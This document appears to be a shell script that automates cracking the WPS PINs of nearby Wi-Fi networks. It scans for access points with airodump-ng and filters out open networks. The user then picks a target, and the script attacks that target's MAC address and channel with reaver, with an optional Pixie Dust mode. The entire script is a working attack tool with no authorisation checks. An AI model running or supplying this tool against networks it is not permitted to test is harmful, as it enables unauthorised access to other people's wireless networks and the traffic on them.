###############
#base func
###############
die(){
echo -e "\033[33mERROR: $1 \033[0m" > /dev/null 1>&2
exit 1
}
print_info(){
echo -n -e '\e[1;36m'
echo -n $1
echo -e '\e[0m'
}
print_xxxx(){
xXxX="#############################"
echo
echo "$xXxX$xXxX$xXxX$xXxX"
echo
}
print_warn(){
echo -n -e '\033[41;37m'
echo -n $1
echo -e '\033[0m'
}
get_random_word(){
D_Num_Random="8"
Num_Random=${1:-$D_Num_Random}
str=`cat /dev/urandom | tr -cd abcdefghjkmnpqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789 | head -c $Num_Random`
echo $str
}
press_any_key(){
echo
print_info "Press any key to start...or Press Ctrl+C to cancel"
get_char_ffff(){
SAVEDSTTY=`stty -g`
stty -echo
stty cbreak
dd if=/dev/tty bs=1 count=1 2> /dev/null
stty -raw
stty echo
stty $SAVEDSTTY
}
get_char_fffff=`get_char_ffff`
echo
}
###############
#default 
###############
Reaver_Code="-a -n -N -x 20 -r 100:10 -l 60 -t 2 -vv -d 0"
if_gw="None"
###############
#main func
###############
Stop_Net(){
service network-manager status > /dev/null 2>&1 && service network-manager stop
}
Check_Used(){
[ -f if_temp ] && . ./if_temp
[ "$if_gw" != "$(Mon_Used)" ] && {
#stop airmon-ng interface
Stop_Mon
#choice interface
Choice_If
#make sumfile
Get_Sum
#temp file
echo "if_gw='$if_gw'" > if_temp
}
}
Mon_Used(){
Surport_Interface_Name=`airmon-ng |grep -v 'Interface'|awk '{print $2}'|sed /^$/d`
if_used=""
for SI in $Surport_Interface_Name
do
if_used=`echo $SI|egrep 'mon$'`
[ "$if_used" != "" ] && if_used_sum="${if_used} ${if_used_sum}"
done
echo ${if_used_sum}
}
Stop_Mon(){
[ "$(Mon_Used)" != "" ] && {
for IS in $(Mon_Used)
do
airmon-ng stop $IS > /dev/null 2>&1
done
}
}
Choice_If(){
clear
print_info "The following is the interface list..."
print_xxxx
airmon-ng|cut -f2-
print_xxxx
print_info "Which one do you want to use?"
echo
read -p "Which: " -e -i wlan if_gw
print_info "Okay,${if_gw} will be used."
press_any_key
#start airmon
airmon-ng start $if_gw > /dev/null 2>&1
if_gw="${if_gw}mon"
}
Get_Sum(){
(sleep 60;kill `ps aucx|grep airodump|awk '{print$2}'`)|airodump-ng $if_gw -w cap --output-format kismet
cat cap*.csv|sed -e '/OPN,None/d' -e '1d'|awk -vFS=";" '{print$22,$1,$4,$6,$3}'|sort -rg|awk '{print$2,$1,$3,$4,$5}'|sed 's/ /\t\t/g'>sumfile
rm cap*.csv
}
Crack_Main(){
clear
print_info "The following is the wireless list..."
print_xxxx 
echo -e "\033[33mNumber\t\tPower\t\tMAC\t\t\t\tChannel\t\tEssid\033[0m"
cat sumfile
print_xxxx
print_info "Which one do you want?(Input the Number)"
read Network_Num
C_NAME=`cat sumfile |sed 's/\t\t/ /g'|egrep "^${Network_Num} "|cut -d' ' -f5-`
print_info "Okay,your answer is ${Network_Num}"
print_info "Essid is $C_NAME"
press_any_key
C_MAC=`cat sumfile |sed 's/\t\t/ /g'|egrep "^${Network_Num} "|cut -d' ' -f3`
C_CH=`cat sumfile |sed 's/\t\t/ /g'|egrep "^${Network_Num} "|cut -d' ' -f4`
Log_Name=`echo ${C_MAC}|sed 's/://g'`
reaver -i $if_gw -b $C_MAC -c $C_CH $Reaver_Code|tee -a ${Log_Name}.log
}
Crack_K1(){
Reaver_Code="$Reaver_Code -K 1"
Crack_Main
}
###############
#base-exc
###############
Stop_Net
Check_Used